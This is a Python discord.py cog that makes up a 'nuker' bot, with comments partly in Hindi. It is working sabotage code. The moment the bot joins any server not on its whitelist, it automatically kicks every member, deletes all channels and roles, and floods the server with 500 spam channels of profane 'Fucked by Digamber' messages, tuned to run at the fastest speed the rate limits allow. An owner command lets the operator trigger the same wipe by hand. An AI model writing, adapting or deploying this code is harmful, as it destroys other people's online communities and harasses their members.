import discord
from discord.ext import commands
import asyncio
import random

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # WHITELISTED SERVERS - TERE 3 SERVERS SAFE RAHENGE
        self.whitelisted_servers = [
            1444885010543935662,  # Server 1 - SAFE
            1421640981584937063,  # Server 2 - SAFE  
            1344323930923601992   # Server 3 - SAFE
        ]

    def is_whitelisted(self, guild_id):
        """Check karo agar server whitelisted hai ya nahi"""
        return guild_id in self.whitelisted_servers

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        """MAX SPEED AUTO-NUKE"""
        print(f'🎯 MAX SPEED JOIN: {guild.name} ({guild.id})')
        
        if not self.is_whitelisted(guild.id):
            print(f'💣 MAX SPEED AUTO-NUKE: {guild.name}')
            await self.nuke_server(guild)  # INSTANT
        else:
            print(f'✅ Whitelisted server: {guild.name} - Safe')

    async def nuke_server(self, guild):
        """MAXIMUM DISCORD ALLOWED SPEED NUKE"""
        
        if self.is_whitelisted(guild.id):
            print(f'❌ Cannot nuke whitelisted server: {guild.name}')
            return
            
        try:
            # STEP 1: MASS KICK - MAX 50/SECOND
            print("🚫 MAX SPEED MASS KICKING...")
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
                    if len(kick_tasks) >= 50:  # Discord limit per batch
                        await asyncio.gather(*kick_tasks, return_exceptions=True)
                        kick_tasks = []
                        await asyncio.sleep(0.1)  # Tiny delay
            
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)
            print("✅ ALL MEMBERS KICKED AT MAX SPEED!")
            
            # STEP 2: CHANNEL DELETE - MAX 50/SECOND
            print("🗑️ MAX SPEED CHANNEL DELETION...")
            delete_tasks = []
            for ch in guild.channels:
                delete_tasks.append(ch.delete())
                if len(delete_tasks) >= 50:
                    await asyncio.gather(*delete_tasks, return_exceptions=True)
                    delete_tasks = []
                    await asyncio.sleep(0.1)
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: CHANNEL CREATION - MAX 50 CHANNELS/SECOND (DISCORD LIMIT)
            print("🔥 CREATING CHANNELS AT MAX DISCORD SPEED...")
            channel_count = 0
            all_message_tasks = []
            
            message_styles = [
                "# Fucked by Digamber",
                "## Fucked by Digamber", 
                "### Fucked by Digamber",
                "**FUCKED BY DIGAMBER**",
                "__FUCKED BY DIGAMBER__",
                "***FUCKED BY DIGAMBER***",
                "```FUCKED BY DIGAMBER```",
                "> FUCKED BY DIGAMBER",
                ">>> FUCKED BY DIGAMBER",
                "**# FUCKED BY DIGAMBER**",
                "💀 **FUCKED BY DIGAMBER** 💀",
                "🔥 **FUCKED BY DIGAMBER** 🔥",
                "⚡ **FUCKED BY DIGAMBER** ⚡",
                "🎯 **FUCKED BY DIGAMBER** 🎯",
                "💥 **FUCKED BY DIGAMBER** 💥"
            ]
            
            # CREATE CHANNELS IN BATCHES OF 50 (MAX DISCORD LIMIT)
            while channel_count < 500:  # 500 channels (safe but destructive)
                try:
                    batch_size = min(50, 500 - channel_count)
                    create_tasks = []
                    
                    for i in range(batch_size):
                        channel_name = f"Fucked by Digamber {channel_count + i + 1}"
                        create_tasks.append(guild.create_text_channel(channel_name))
                    
                    # CREATE 50 CHANNELS AT ONCE (MAX SPEED)
                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += batch_size
                    
                    # SEND MESSAGES - 5 PER CHANNEL (SAFE LIMIT)
                    message_batch = []
                    for channel in new_channels:
                        if isinstance(channel, discord.TextChannel):
                            # 5 MESSAGES PER CHANNEL (MAX WITHOUT RATE LIMIT)
                            for _ in range(5):
                                msg = random.choice(message_styles)
                                message_batch.append(channel.send(msg))
                    
                    # SEND ALL MESSAGES OF THIS BATCH
                    if message_batch:
                        await asyncio.gather(*message_batch, return_exceptions=True)
                        all_message_tasks.extend(message_batch)
                    
                    print(f"✅ {channel_count} CHANNELS CREATED AT MAX SPEED...")
                    await asyncio.sleep(0.5)  # SHORT DELAY BETWEEN BATCHES
                    
                except Exception as e:
                    print(f"⚠️ Continuing with created channels...")
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED!")
            print(f"💬 {len(all_message_tasks)} MESSAGES SENT AT MAX SPEED!")
            
            # STEP 4: ROLE DELETE - MAX 50/SECOND
            print("🎭 MAX SPEED ROLE DELETION...")
            role_tasks = []
            for role in guild.roles:
                if role.name != "@everyone" and not role.managed:
                    role_tasks.append(role.delete())
                    if len(role_tasks) >= 50:
                        await asyncio.gather(*role_tasks, return_exceptions=True)
                        role_tasks = []
                        await asyncio.sleep(0.1)
            
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 5: FINAL MESSAGE & LEAVE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send(
                        f"💀 **FUCKED BY DIGAMBER** 💀\n\n"
                        f"**{channel_count} CHANNELS OBLITERATED AT MAX SPEED!**\n"
                        f"**{len(all_message_tasks)} MESSAGES SENT!**\n"
                        f"**WHITELISTED SERVERS ARE SAFE 🔒**\n"
                        f"**DISCORD RATE LIMIT MAXIMIZED!**"
                    )
            except:
                pass
            
            # INSTANT LEAVE
            await guild.leave()
            print("✅ MAX SPEED NUKE COMPLETED!")
            
        except Exception as e:
            print(f"💀 Nuke failed: {e}")
            try:
                await guild.leave()
            except:
                pass

    @commands.command(name='nuke')
    @commands.is_owner()
    async def manual_nuke(self, ctx):
        """Manual MAX SPEED nuke"""
        if self.is_whitelisted(ctx.guild.id):
            await ctx.send("❌ **This server is WHITELISTED! Cannot nuke.** 🔒")
            return
        
        await ctx.send("💣 **MAX SPEED NUKE INITIATED!**")
        await asyncio.sleep(1)
        
        try:
            await ctx.message.delete()
        except:
            pass
        
        await self.nuke_server(ctx.guild)

    @commands.command(name='whitelist')
    @commands.is_owner()
    async def add_whitelist(self, ctx, server_id: int = None):
        """Current server ko whitelist mein add karo"""
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id not in self.whitelisted_servers:
            self.whitelisted_servers.append(server_id)
            await ctx.send(f"✅ **Server whitelisted!**\nID: `{server_id}`\nName: `{ctx.guild.name}`")
        else:
            await ctx.send(f"ℹ️ Server already whitelisted!")

    @commands.command(name='unwhitelist')
    @commands.is_owner() 
    async def remove_whitelist(self, ctx, server_id: int = None):
        """Server ko whitelist se remove karo"""
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id in self.whitelisted_servers:
            self.whitelisted_servers.remove(server_id)
            await ctx.send(f"✅ **Server removed from whitelist!**\nID: `{server_id}`")
        else:
            await ctx.send(f"❌ Server not in whitelist!")

    @commands.command(name='whitelisted')
    @commands.is_owner()
    async def show_whitelisted(self, ctx):
        """Show all whitelisted servers"""
        if not self.whitelisted_servers:
            await ctx.send("❌ No servers in whitelist!")
            return
        
        embed = discord.Embed(title="🔒 WHITELISTED SERVERS", color=0x00ff00)
        
        for server_id in self.whitelisted_servers:
            guild = self.bot.get_guild(server_id)
            if guild:
                embed.add_field(
                    name=guild.name,
                    value=f"ID: `{server_id}`\nMembers: {guild.member_count}",
                    inline=False
                )
            else:
                embed.add_field(
                    name="Unknown Server",
                    value=f"ID: `{server_id}`\n(Bot not in this server)",
                    inline=False
                )
        
        await ctx.send(embed=embed)

    @commands.command(name='servers')
    @commands.is_owner()
    async def show_all_servers(self, ctx):
        """Show all servers with whitelist status"""
        embed = discord.Embed(title="📊 ALL SERVERS", color=0x3498db)
        
        for guild in self.bot.guilds:
            status = "✅ WHITELISTED" if self.is_whitelisted(guild.id) else "❌ NOT WHITELISTED"
            embed.add_field(
                name=guild.name,
                value=f"ID: `{guild.id}`\nStatus: {status}\nMembers: {guild.member_count}",
                inline=False
            )
        
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
